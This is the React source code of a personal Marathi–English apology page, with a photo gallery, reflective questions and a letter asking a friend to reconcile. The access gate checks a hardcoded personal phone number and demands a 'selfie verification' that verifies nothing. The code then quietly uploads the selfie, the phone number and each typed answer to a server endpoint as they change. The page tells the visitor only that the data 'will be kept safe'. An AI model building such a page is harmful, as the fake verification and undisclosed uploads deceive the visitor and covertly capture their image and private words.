import React, { FormEvent, useEffect, useRef, useState } from 'react'
import { createRoot } from 'react-dom/client'
import { AnimatePresence, motion, useReducedMotion } from 'framer-motion'
import { ArrowLeft, ArrowRight, Camera, CheckCircle2, Flower2, Heart, MessageCircle, RefreshCw, ShieldCheck, Sparkles, X } from 'lucide-react'
import './styles.css'

type Photo = { src: string; alt: string; caption: string; position: string }
type Answers = Record<number, string>
const BASE = import.meta.env.BASE_URL || '/'
const photos: Photo[] = [
  { src: `${BASE}images/portrait-flowers-3.jpeg`, alt: 'A graceful portrait near the water', caption: 'That effortless smile', position: '50% 28%' },
  { src: `${BASE}images/portrait-evening.jpeg`, alt: 'An elegant evening portrait', caption: 'A little moment worth keeping', position: '50% 25%' },
  { src: `${BASE}images/portrait-flowers-1.jpeg`, alt: 'A soft portrait in a floral outfit', caption: 'Some memories just stay', position: '50% 31%' },
  { src: `${BASE}images/portrait-green.jpeg`, alt: 'A cheerful candid portrait', caption: 'One of those ordinary, lovely days', position: '50% 26%' },
  { src: `${BASE}images/portrait-flowers-2.jpeg`, alt: 'A quiet portrait by the water', caption: 'A quiet, lovely frame', position: '50% 30%' },
]
const photoQuestions = ['हा फोटो पाहिल्यावर सर्वात आधी कोणता शब्द मनात येतो?','या छोट्याशा क्षणात तुला सगळ्यात जास्त काय आवडतं?','हा फोटो बघून तुला एखादी खास आठवण आली का?','या सुंदर आठवणीला तू काय नाव देशील?','हा फोटो पाहून मनात आलेला एक छोटासा विचार सांगशील का?']
const letter = [
  'Hey,',
  'एक गोष्ट सांगायची होती...',
  'त्या दिवशी जे झालं त्याचा मला राग आला होता, पण खरं सांगायचं तर थोडं जास्तच वाईट वाटलं होतं.',
  'कदाचित मी जास्त react झालो असेन. नंतर तू माझ्याशी बोलण्याचा प्रयत्न केलास, पण मी दुर्लक्ष केलं. त्याबद्दल Sorry.',
  'आपली मैत्री माझ्यासाठी खूप महत्त्वाची आहे. तुझ्याशी बोलणं, मस्ती करणं आणि छोट्या छोट्या गोष्टी share करणं या सगळ्याची सवय झालीये.',
  'म्हणूनच कदाचित तुझ्याबाबतीत काही गोष्टी मला जरा जास्त लागतात.',
  'पण त्यासाठी तुझ्यावर रागावणं किंवा तुला ignore करणं योग्य नव्हतं, हे मला कळतंय.',
  'मला आपल्यात असा अबोला नकोय. तू माझ्यासाठी खरंच special आहेस आणि आपलं नातं असं खराब व्हावं असं मला वाटत नाही.',
  'बाकी तुलाही काही बोलायचं असेल तर नक्की सांग. 😊'
]
const VALID_CONTACT = '7757828167'
const stageLabels = ['Hello','Moments','Memory','Little things','A note','Surprise','Whenever']

function Screen({ children, id }: { children: React.ReactNode; id: string }) {
  return <motion.div className="screen-motion" key={id} initial={{opacity:0,y:22}} animate={{opacity:1,y:0}} exit={{opacity:0,y:-16}} transition={{duration:.55,ease:[.22,1,.36,1]}}>{children}</motion.div>
}

function App() {
  const reduced = useReducedMotion()
  const [access,setAccess] = useState(false), [phone,setPhone] = useState(''), [opened,setOpened] = useState(false)
  const [stage,setStage] = useState(0), [photoIndex,setPhotoIndex] = useState(0), [lightbox,setLightbox] = useState(false)
  const [surpriseOpen,setSurpriseOpen] = useState(false), [finalMessage,setFinalMessage] = useState('')
  const [answers,setAnswers] = useState<Answers>(() => { try { return JSON.parse(localStorage.getItem('little-surprise-answers') || '{}') as Answers } catch { return {} } })

  // Camera & selfie validation states
  const [photoCaptured, setPhotoCaptured] = useState<string>(() => {
    try { return localStorage.getItem('little-surprise-photo') || '' } catch { return '' }
  })
  const [isCameraActive, setIsCameraActive] = useState(false)
  const [cameraError, setCameraError] = useState('')
  const videoRef = useRef<HTMLVideoElement | null>(null)
  const mediaStreamRef = useRef<MediaStream | null>(null)
  const fileInputRef = useRef<HTMLInputElement | null>(null)

  const startCamera = async () => {
    setCameraError('')
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 480 } }
      })
      mediaStreamRef.current = stream
      setIsCameraActive(true)
      setTimeout(() => {
        if (videoRef.current) {
          videoRef.current.srcObject = stream
          videoRef.current.play().catch(() => {})
        }
      }, 100)
    } catch {
      setCameraError('कॅमेरा सुरू करता आला नाही. कृपया परवानगी द्या किंवा खालील बटणाने फोटो निवडा.')
      setIsCameraActive(false)
    }
  }

  const stopCamera = () => {
    if (mediaStreamRef.current) {
      mediaStreamRef.current.getTracks().forEach(t => t.stop())
      mediaStreamRef.current = null
    }
    setIsCameraActive(false)
  }

  const capturePhoto = () => {
    if (!videoRef.current) return
    const video = videoRef.current
    const canvas = document.createElement('canvas')
    canvas.width = video.videoWidth || 480
    canvas.height = video.videoHeight || 480
    const ctx = canvas.getContext('2d')
    if (ctx) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
      const dataUrl = canvas.toDataURL('image/jpeg', 0.85)
      setPhotoCaptured(dataUrl)
      try { localStorage.setItem('little-surprise-photo', dataUrl) } catch {}
      stopCamera()
      saveAnswersToServer(buildAnswersPayload(answers, dataUrl))
    }
  }

  const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (file) {
      const reader = new FileReader()
      reader.onload = () => {
        const dataUrl = reader.result as string
        setPhotoCaptured(dataUrl)
        try { localStorage.setItem('little-surprise-photo', dataUrl) } catch {}
        stopCamera()
        saveAnswersToServer(buildAnswersPayload(answers, dataUrl))
      }
      reader.readAsDataURL(file)
    }
  }

  useEffect(() => {
    return () => {
      if (mediaStreamRef.current) {
        mediaStreamRef.current.getTracks().forEach(t => t.stop())
      }
    }
  }, [])

  const buildAnswersPayload = (customAnswers?: Answers, customPhoto?: string) => {
    const current = customAnswers || answers
    const photo = customPhoto !== undefined ? customPhoto : photoCaptured
    return {
      savedAt: new Date().toISOString(),
      phone: phone.trim() ? `+91 ${phone.trim()}` : 'Not provided',
      hasVerificationPhoto: Boolean(photo),
      verificationPhoto: photo || null,
      questionsAndAnswers: photos.map((p, i) => ({
        id: i + 1,
        photoCaption: p.caption,
        question: photoQuestions[i],
        answer: current[i] ? current[i].trim() : 'उत्तर दिले नाही'
      }))
    }
  }

  const saveAnswersToServer = async (payload: object) => {
    try {
      await fetch('/api/save-answers', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      })
    } catch {}
  }

  useEffect(() => {
    try {
      localStorage.setItem('little-surprise-answers', JSON.stringify(answers))
    } catch {}
    saveAnswersToServer(buildAnswersPayload())
  }, [answers])

  useEffect(() => {
    window.scrollTo({ top: 0, behavior: reduced ? 'auto' : 'smooth' })
  }, [stage, reduced])

  useEffect(() => { const key=(e:KeyboardEvent)=>e.key==='Escape'&&setLightbox(false); addEventListener('keydown',key); return()=>removeEventListener('keydown',key) },[])
  const go=(n:number)=>setStage(Math.max(0,Math.min(6,n)))
  const cleanPhone = phone.replace(/\D/g, '').slice(-10)
  const isPhoneComplete = cleanPhone.length === 10
  const isPhoneValid = cleanPhone === VALID_CONTACT

  const unlock=(e:FormEvent)=>{
    e.preventDefault()
    if(isPhoneValid && photoCaptured) {
      stopCamera()
      setAccess(true)
      saveAnswersToServer(buildAnswersPayload())
    }
  }

  useEffect(() => {
    if (stage === 2) {
      saveAnswersToServer(buildAnswersPayload())
    }
  }, [stage])

  if(!access)return <main className="gate-page"><motion.form className="gate-card" onSubmit={unlock} initial={{opacity:0,y:18}} animate={{opacity:1,y:0}}><div className="seal"><ShieldCheck/></div><span className="kicker">A PRIVATE LITTLE PAGE</span><h1>Made only<br/><em>for you.</em></h1><p>तुझ्यासाठी एक छोटीशी surprise आहे. पुढे जाण्यासाठी phone number टाक आणि सेल्फी व्हेरिफिकेशन कर.</p><label htmlFor="phone">Phone number</label><div className="phone-field"><span>+91</span><input id="phone" type="tel" inputMode="numeric" autoComplete="off" value={phone} onChange={e=>setPhone(e.target.value.replace(/[^\d ]/g,''))} placeholder=""/></div>

    {isPhoneComplete && !isPhoneValid && (
      <p className="camera-error" style={{ margin: '8px 0 16px', fontWeight: 500 }}>
        हा नंबर योग्य नाही. ही सरप्राईज फक्त खास व्यक्तीसाठी आहे! ❤️
      </p>
    )}

    {isPhoneValid && (
      <div className="camera-box">
        <label>Validation साठी तुमचा फोटो 📸</label>
        {photoCaptured ? (
          <div className="photo-preview">
            <img src={photoCaptured} alt="Verification selfie" className="photo-thumb" />
            <span className="verified-tag"><CheckCircle2 size={16}/> फोटो व्हेरिफाय झाला!</span>
            <button type="button" className="camera-btn" onClick={() => { setPhotoCaptured(''); startCamera(); }}><RefreshCw size={14}/> पुन्हा फोटो घ्या</button>
          </div>
        ) : isCameraActive ? (
          <div className="camera-stream-wrap">
            <video ref={videoRef} autoPlay playsInline muted className="camera-video" />
          </div>
        ) : (
          <div className="camera-prompt">
            <p>पुढे जाण्यासाठी कृपया एक छान स्माईल देऊन फोटो क्लिक करा.</p>
          </div>
        )}

        {!photoCaptured && (
          <div className="camera-actions">
            {isCameraActive ? (
              <>
                <button type="button" className="camera-btn capture" onClick={capturePhoto}><Camera size={16}/> फोटो क्लिक करा</button>
                <button type="button" className="camera-btn upload" onClick={stopCamera}>कॅन्सल</button>
              </>
            ) : (
              <>
                <button type="button" className="camera-btn capture" onClick={startCamera}><Camera size={16}/> कॅमेरा सुरू करा</button>
                <button type="button" className="camera-btn upload" onClick={() => fileInputRef.current?.click()}>फोटो निवडा</button>
              </>
            )}
          </div>
        )}
        <input ref={fileInputRef} type="file" accept="image/*" capture="user" style={{ display: 'none' }} onChange={handleFileUpload} />
        {cameraError && <p className="camera-error">{cameraError}</p>}
      </div>
    )}

    <small><ShieldCheck/> हा नंबर आणि फोटो सुरक्षित ठेवले जातील.</small>
    <button className="primary" disabled={!isPhoneValid || !photoCaptured}>
      {!isPhoneComplete ? 'Phone number टाका' : !isPhoneValid ? 'अवैध नंबर (Incorrect Number)' : !photoCaptured ? 'कृपया फोटो क्लिक करा (Validation)' : 'Open the page ✨'}
    </button>
  </motion.form></main>
  if(!opened)return <main className="intro-page"><div className="ambient a"/><div className="ambient b"/><motion.div className="intro-content" initial={{opacity:0,scale:.97}} animate={{opacity:1,scale:1}}><motion.div className="heart-line" animate={reduced?{}:{scale:[1,1.08,1]}} transition={{duration:2.4,repeat:Infinity}}><Heart/></motion.div><span className="kicker">A LITTLE SURPRISE</span><h1>Hey, I made<br/>something <em>for you...</em></h1><p>Just a little reason to smile.</p><button className="primary" onClick={()=>setOpened(true)}>Begin the little journey <ArrowRight/></button></motion.div></main>

  return <main className="experience"><header className="site-header"><button className="wordmark" onClick={()=>go(0)}><Heart/> A Little <em>Surprise</em></button><div className="stage-meta"><b>{stage===1?'CHAPTER':'SECTION'}</b><span>{stage===1?String(photoIndex+1).padStart(2,'0'):String(stage+1).padStart(2,'0')}</span><i/><span>{stage===1?'05':'07'}</span></div></header><nav className="progress-nav" aria-label="Journey progress">{stageLabels.map((label,i)=><button key={label} className={i===stage?'active':i<stage?'done':''} onClick={()=>i<=stage&&go(i)} disabled={i>stage} aria-label={label}><span/></button>)}</nav>
  <AnimatePresence mode="wait">
  {stage===0&&<Screen id="hero"><section className="hero-screen"><div className="hero-copy"><span className="kicker">FOR SOMEONE TRULY SPECIAL</span><h1>A Little<br/><em>Surprise</em></h1><p>Some people make ordinary days feel a little more special. You’re one of them.</p><button className="primary" onClick={()=>go(1)}>Explore our little moments <ArrowRight/></button></div><motion.button className="hero-portrait" onClick={()=>setLightbox(true)} aria-label="View portrait" initial={{clipPath:'inset(0 0 100% 0 round 180px 180px 24px 24px)'}} animate={{clipPath:'inset(0 0 0% 0 round 180px 180px 24px 24px)'}} transition={{duration:1,ease:[.22,1,.36,1]}}><span className="portrait-wash"/><img src={photos[0].src} alt={photos[0].alt}/><span className="photo-tag">A lovely little frame</span></motion.button></section></Screen>}
  {stage===1&&<Screen id={`photo-${photoIndex}`}><section className="story-screen"><div className="story-heading"><span className="kicker">LITTLE FRAMES · {String(photoIndex+1).padStart(2,'0')} / 05</span><h2>Beautiful moments,<br/><em>kept softly.</em></h2><p>Small glimpses that deserve to be remembered.</p></div><div className="story-photo-wrap"><motion.button className="story-photo" onClick={()=>setLightbox(true)} aria-label="Open photo" initial={{opacity:0,y:40,scale:.96,filter:'blur(6px)'}} animate={{opacity:1,y:0,scale:1,filter:'blur(0px)'}} transition={{duration:.9,ease:[.22,1,.36,1]}}><img src={photos[photoIndex].src} alt={photos[photoIndex].alt} style={{objectPosition:photos[photoIndex].position}}/></motion.button><motion.p className="photo-caption" initial={{opacity:0}} animate={{opacity:1}} transition={{delay:.65}}>{photos[photoIndex].caption}</motion.p></div><motion.div className="story-question" initial={{opacity:0,y:22}} animate={{opacity:1,y:0}} transition={{delay:.5}}><div className="question-top"><span>एक छोटासा प्रश्न</span><b>{photoIndex+1} / {photos.length}</b></div><label htmlFor="story-answer">{photoQuestions[photoIndex]}</label><textarea id="story-answer" value={answers[photoIndex]||''} onChange={e=>setAnswers({...answers,[photoIndex]:e.target.value})} placeholder="मनात आलं ते इथे लिही..." rows={3}/><div className="story-actions"><button className="ghost" onClick={()=>setPhotoIndex(Math.max(0,photoIndex-1))} disabled={photoIndex===0}><ArrowLeft/> मागचा</button><button className="text-action" onClick={()=>photoIndex<4?setPhotoIndex(photoIndex+1):go(2)}>Skip</button><button className="primary" onClick={()=>photoIndex<4?setPhotoIndex(photoIndex+1):go(2)}>{photoIndex<4?'पुढचा फोटो':'पुढे जाऊया'} <ArrowRight/></button></div></motion.div></section></Screen>}
  {stage===2&&<Screen id="memory"><section className="memory-screen"><div className="memory-photo"><img src={`${BASE}images/office-friends.jpeg`} alt="Two friends sharing a cheerful office moment"/></div><div className="memory-copy"><Heart/><span className="kicker">OUR LITTLE MEMORIES</span><h2>Some moments<br/><em>just stay.</em></h2><p>From everyday office conversations to the little jokes that made us laugh, some moments become special without us even realizing it.</p><blockquote>“Ordinary days. Quietly special memories.”</blockquote><button className="primary" onClick={()=>go(3)}>There’s a little more <ArrowRight/></button></div></section></Screen>}
  {stage===3&&<Screen id="qualities"><section className="qualities-screen"><div className="center-heading"><span className="kicker">THE LITTLE THINGS</span><h2>What makes you <em>special</em></h2><p>Not grand gestures. Just the little things that feel naturally warm.</p></div><div className="quality-grid">{[[<Sparkles/>,'Your Smile','Some smiles have a way of making an ordinary moment better.'],[<MessageCircle/>,'Our Conversations','The random talks and silly jokes are sometimes the best parts of a day.'],[<Heart/>,'Your Friendship','Some connections become important naturally, without needing an explanation.']].map(([icon,title,copy],i)=><motion.article key={String(title)} initial={{opacity:0,y:25}} animate={{opacity:1,y:0}} transition={{delay:i*.12}}><span>{icon}</span><b>0{i+1}</b><h3>{title}</h3><p>{copy}</p></motion.article>)}</div><button className="primary centered-button" onClick={()=>go(4)}>Read a small note <ArrowRight/></button></section></Screen>}
  {stage===4&&<Screen id="letter"><section className="letter-screen"><div className="letter-deco"><Heart/></div><article><span className="kicker">A NOTE FROM THE HEART</span><h2>Just something<br/><em>I wanted to say.</em></h2><div className="letter-body">{letter.map((line,i)=><motion.p key={line} initial={{opacity:0,y:8}} animate={{opacity:1,y:0}} transition={{delay:.15+i*.07}}>{line}</motion.p>)}</div><span className="signature">with care</span></article><button className="primary letter-next" onClick={()=>go(5)}>One more thing <ArrowRight/></button></section></Screen>}
  {stage===5&&<Screen id="surprise"><section className="surprise-screen"><AnimatePresence mode="wait">{!surpriseOpen?<motion.div key="closed" exit={{opacity:0,scale:.95}}><span className="kicker">ONE MORE THING</span><h2>A small bloom,<br/><em>just for you.</em></h2><p>Because a little kindness deserves a little flower.</p><button className="primary" onClick={()=>setSurpriseOpen(true)}>Open the last surprise <Sparkles/></button></motion.div>:<motion.div className="bloom-reveal" key="open" initial={{opacity:0,scale:.7}} animate={{opacity:1,scale:1}}><div className="flower"><Flower2/></div><i className="petal one">✦</i><i className="petal two">✦</i><i className="petal three">✦</i><h2>Keep smiling.<br/><em>It suits you.</em></h2><p>And thank you for being a special part of my days.</p><button className="primary" onClick={()=>go(6)}>One last page <ArrowRight/></button></motion.div>}</AnimatePresence></section></Screen>}
  {stage===6&&<Screen id="final"><section className="final-screen"><span className="kicker">WHENEVER YOU’RE READY</span><h2>Can we start again<br/><em>with a smile?</em></h2><p>No pressure. Just hoping we can talk like we used to.</p><div className="final-actions"><button className="primary" onClick={()=>setFinalMessage('Whenever you feel comfortable, I’d be glad to talk.')}>Let’s talk</button><button className="ghost" onClick={()=>setFinalMessage('That’s okay. Take your time.')}>Maybe later</button></div><AnimatePresence>{finalMessage&&<motion.div className="final-message" initial={{opacity:0,y:10}} animate={{opacity:1,y:0}}>{finalMessage}</motion.div>}</AnimatePresence></section></Screen>}
  </AnimatePresence>{stage>0&&<button className="floating-back" onClick={()=>go(stage-1)} aria-label="Previous section"><ArrowLeft/></button>}<AnimatePresence>{lightbox&&<motion.div className="lightbox" role="dialog" aria-modal="true" aria-label="Photo viewer" initial={{opacity:0}} animate={{opacity:1}} exit={{opacity:0}} onClick={()=>setLightbox(false)}><button className="lightbox-close" onClick={()=>setLightbox(false)} aria-label="Close"><X/></button><motion.img src={stage===1?photos[photoIndex].src:photos[0].src} alt={stage===1?photos[photoIndex].alt:photos[0].alt} initial={{scale:.96}} animate={{scale:1}} onClick={e=>e.stopPropagation()}/></motion.div>}</AnimatePresence></main>
}
createRoot(document.getElementById('root')!).render(<React.StrictMode><App/></React.StrictMode>)
